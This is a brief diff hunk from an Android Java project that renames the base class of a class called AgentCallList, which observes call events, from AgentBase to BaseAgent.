@@ -21,7 +21,7 @@ import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.WChar;
 
-public class AgentCallList extends AgentBase implements Observer<Call> {
+public class AgentCallList extends BaseAgent implements Observer<Call> {
 	private static final String TAG = "AgentCallList"; //$NON-NLS-1$
 
 	@Override
